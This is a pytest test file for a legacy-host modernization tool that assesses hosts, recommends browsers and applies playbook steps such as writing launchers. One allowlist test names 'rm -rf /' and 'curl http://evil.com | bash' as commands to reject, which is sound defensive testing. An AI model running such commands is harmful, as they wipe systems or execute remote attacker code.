"""Tests for legacy host modernization (assess, playbook, browser, apply)."""

from __future__ import annotations

from unittest.mock import patch

import pytest

from alma_bridge.compliance.modernization import (
    apply_playbook_steps,
    assess_browsers,
    assess_host,
    build_modernization_playbook,
    recommend_browser,
)
from alma_bridge.compliance.modernization.apply import is_allowed_mutation_command


def test_assess_host_structure():
    result = assess_host(os_release="ID=ubuntu\nID_LIKE=debian")
    assert result["verdict"] in {"ready", "mostly_ready", "needs_modernization"}
    assert "potato_score" in result
    assert "browsers" in result
    assert "browser_recommendation" in result
    assert "gaps" in result
    assert result["package_manager"] == "apt"


def test_recommend_browser_tiers():
    minimal = recommend_browser(ram_mb=512, os_release="ID=ubuntu")
    assert minimal["tier"] == "minimal"
    light = recommend_browser(ram_mb=1536, os_release="ID=ubuntu")
    assert light["tier"] == "light"
    full = recommend_browser(ram_mb=8192, os_release="ID=ubuntu")
    assert full["tier"] == "full"
    assert full["install_command"]
    assert "#!/bin/bash" in full["launch_script"]


def test_assess_browsers_returns_list():
    result = assess_browsers()
    assert "installed" in result
    assert "has_modern_browser" in result


def test_playbook_includes_core_steps():
    assessment = assess_host(os_release="ID=ubuntu")
    playbook = build_modernization_playbook(assessment, os_release="ID=ubuntu")
    ids = [s["id"] for s in playbook["steps"]]
    assert "clock_sync" in ids
    assert "install_ca_bundle" in ids
    assert "tls_bridge_advisory" in ids
    assert playbook["apply_step_ids"]


def test_apply_requires_allow_mutations():
    playbook = build_modernization_playbook(os_release="ID=ubuntu")
    out = apply_playbook_steps(playbook["steps"], allow_mutations=False)
    assert out["applied"] is False
    assert "allow_mutations" in out["reason"]


def test_mutation_allowlist():
    assert is_allowed_mutation_command("sudo apt-get install -y firefox-esr")
    assert is_allowed_mutation_command("sudo ldconfig")
    assert is_allowed_mutation_command("sudo dpkg --add-architecture i386")
    assert not is_allowed_mutation_command("rm -rf /")
    assert not is_allowed_mutation_command("curl http://evil.com | bash")


def test_apply_write_browser_launcher_without_sudo(tmp_path, monkeypatch):
    """User-local playbook steps must not require sudo preparation."""
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setattr(
        "alma_bridge.compliance.modernization.apply.prepare_sudo",
        lambda **kwargs: (_ for _ in ()).throw(AssertionError("sudo should not be requested")),
    )
    script = "#!/bin/bash\nexec firefox --disable-gpu \"$@\"\n"
    steps = [
        {
            "id": "write_browser_launcher",
            "kind": "remediation",
            "script_content": script,
        }
    ]
    out = apply_playbook_steps(steps, allow_mutations=True)
    assert out["applied"] is True
    assert out["success"] is True


def test_apply_write_browser_launcher(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    script = "#!/bin/bash\nexec firefox --disable-gpu \"$@\"\n"
    steps = [
        {
            "id": "write_browser_launcher",
            "kind": "remediation",
            "script_content": script,
        }
    ]
    out = apply_playbook_steps(steps, allow_mutations=True)
    assert out["applied"] is True
    assert out["success"] is True
    launcher = tmp_path / ".local" / "bin" / "alma-browser"
    assert launcher.exists()
    assert "firefox" in launcher.read_text()


def test_apply_school_desktop_shortcut(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    bin_dir = tmp_path / ".local" / "bin"
    bin_dir.mkdir(parents=True)
    launcher = bin_dir / "alma-browser"
    launcher.write_text("#!/bin/bash\nexec firefox\n", encoding="utf-8")
    launcher.chmod(0o755)
    steps = [{"id": "school_desktop_shortcut", "kind": "remediation"}]
    with patch("alma_bridge.compliance.modernization.apply.prepare_sudo", return_value=(True, "")):
        out = apply_playbook_steps(steps, allow_mutations=True)
    assert out["success"] is True
    desktop = tmp_path / ".local" / "share" / "applications" / "alma-classroom-browser.desktop"
    assert desktop.exists()
    assert "Classroom Browser" in desktop.read_text()


def test_autopilot_mutations_when_allowed(monkeypatch):
    from alma_bridge.compliance import autopilot

    monkeypatch.setattr(
        "alma_bridge.compliance.modernization.apply.apply_pathway_steps",
        lambda pathway, **kw: [{"command": "sudo ldconfig", "ok": True, "step_id": "x"}],
    )
    plan = autopilot.run_autopilot(
        "error while loading shared libraries: libfoo.so.2: cannot open shared object file",
        execute=True,
        allow_mutations=True,
    )
    assert plan["mutations_applied"] is True
    assert plan["executed_remediations"]
